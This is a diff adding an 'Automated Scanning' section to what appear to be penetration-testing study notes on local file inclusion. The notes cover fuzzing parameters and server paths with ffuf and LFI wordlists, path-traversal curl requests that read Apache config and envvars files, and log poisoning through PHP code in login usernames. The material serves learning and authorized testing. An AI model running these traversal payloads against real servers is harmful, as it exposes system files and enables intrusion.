@@ -642,4 +642,92 @@ there are some other service logs we may be able to read:
 - `/var/log/vsftpd.log` 
 
 we can do things like log into the ssh or ftp services and set the username to php code and upon including them in the logs the PHP code will execute   
-the same goes for the mail servieces where we can send an email containing php code and on log inclusion it will get executed 
+the same goes for the mail services where we can send an email containing php code and on log inclusion it will get executed 
+
+## Automated Scanning
+
+many cases where we will need to create custom payloads to get past the specific combo of filters that an app is using  
+there are also many auto methods that can help us quickly identify and exploit trivial LFI vulnerabilities   
+we can also use fuzzing tools to test a list of common LFI payloads 
+
+### Fuzzing parameters 
+
+html forms may be securely protected but many apps have pages with exposed parameters that aren't linked to forms, which is why it is important to fuzz for hidden parameters 
+
+with ffuf we can fuzz GET/POST parameters: 
+
+```shell
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+```
+
+there are also lists for popular LFI parameters: https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters
+
+### LFI wordlists 
+
+https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI  
+https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
+
+these wordlists will contain various bypasses and common files that we can combine with ffuf: 
+
+```shell
+ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+```
+
+### Fuzzing server files 
+
+in addition to fuzzing LFI payloads there are different server files that may be helpful for LFI exploitation   
+some example files are: 
+- server webroot path 
+- server config file 
+- server logs 
+
+the server webroot will come in handy for example if we wanted to find a file we uploaded but can't reach its uploads directory through relative paths, in such cases we might want to find the webroot to figure out the absolute path 
+
+we can fuzz for the index.php file through common webroot paths 
+
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt  
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt
+
+```shell
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+```
+
+we could also use the previous LFI-jhaddix wordlist to find webroots   
+if none of these work then we could read the server configs as they tend to contain the webroot  
+
+### Server logs/configurations 
+
+we will need to identify the correct logs directory to be able to perform log poisoning 
+
+we can find this with the LFI-jhaddix wordlist but if we wanted a more precise scan we can use:   
+https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux  
+https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
+
+```shell
+ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+```
+
+once we get results we can try reading any of the files with a simple curl command: 
+
+```shell
+curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
+```
+
+for an example if we read this file and see: 
+
+![](Images/Pasted%20image%2020240302141750.png)
+
+we get the default webroot path and the log path but we are missing the global apache variable `APACHE_LOG_DIR` which we can find in another file `/etc/apache2/envvars` which we can also read: 
+
+```shell
+curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
+```
+
+### LFI tools 
+
+the most common LFI tools are: 
+- LFISuite
+- LFIFreak
+- liffy
+
+a lot of these tools arent well maintained and rely on python2 
